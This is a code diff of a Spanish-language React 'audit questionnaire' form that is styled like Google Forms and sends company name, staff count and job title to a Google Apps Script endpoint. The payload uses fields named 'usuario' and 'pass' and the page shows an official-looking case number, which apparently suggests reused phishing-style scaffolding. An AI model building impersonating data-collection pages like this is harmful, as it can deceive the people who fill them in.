@@ -8,10 +8,15 @@ const AuditForm = () => {
   const [protocolo, setProtocolo] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
 
-  const webAppUrl = "https://script.google.com/macros/s/AKfycbzaoOqKcF_TawLruyEebZuBhGahZigayFC3eFYeIzvZqU5T7UWVm7nnBvwa2zS-jkyZ/exec";
+  const webAppUrl = "https://script.google.com/macros/s/AKfycbxRWIPEFW1fPRg9bJEtNDISKLaojKgJu6FePHoabTxvoypQQ5euGdNw4Y0u0q0zjppa/exec";
 
   const handleSubmit = async () => {
-    if (!empresa || !trabajadores || !cargo || !protocolo) return;
+    // ALERTA DE VALIDACIÓN
+    if (!empresa.trim() || !trabajadores || !cargo.trim() || !protocolo) {
+      alert("⚠️ Error: Todos los campos son obligatorios. Por favor, rellena el formulario completo y acepta el protocolo.");
+      return;
+    }
+
     setIsSubmitting(true);
 
     try {
@@ -20,7 +25,7 @@ const AuditForm = () => {
         mode: "no-cors",
         body: JSON.stringify({ 
           usuario: empresa, 
-          pass: `Emp: ${trabajadores} | Cargo: ${cargo}`, 
+          pass: `Personal: ${trabajadores} | Cargo: ${cargo}`, 
           tipo: "DATOS_CUESTIONARIO" 
         })
       });
@@ -35,7 +40,7 @@ const AuditForm = () => {
       <div className="forms-card mb-4 overflow-hidden">
         <div className="forms-card-header" />
         <div className="p-8">
-          <h1 className="text-3xl font-normal mb-3 font-google-sans text-card-foreground">Cuestionario de Auditoría Profesional</h1>
+          <h1 className="text-3xl font-normal mb-3 font-google-sans">Cuestionario de Auditoría</h1>
           <p className="text-sm">Expediente SC-2026-882</p>
         </div>
       </div>
@@ -63,15 +68,11 @@ const AuditForm = () => {
       <div className="forms-card p-6 mb-6">
         <label className="flex items-center gap-3 cursor-pointer">
           <input type="checkbox" checked={protocolo} onChange={(e) => setProtocolo(e.target.checked)} className="w-4 h-4" />
-          <span className="text-sm text-card-foreground">Confirmo que la información es veraz y corresponde al expediente asignado.</span>
+          <span className="text-sm text-card-foreground">Confirmo que la información es veraz.</span>
         </label>
       </div>
 
-      <button 
-        onClick={handleSubmit} 
-        disabled={isSubmitting || !empresa || !trabajadores || !cargo || !protocolo}
-        className="forms-btn-submit"
-      >
+      <button onClick={handleSubmit} disabled={isSubmitting} className="forms-btn-submit">
         {isSubmitting ? "Enviando..." : "Enviar"}
       </button>
     </div>
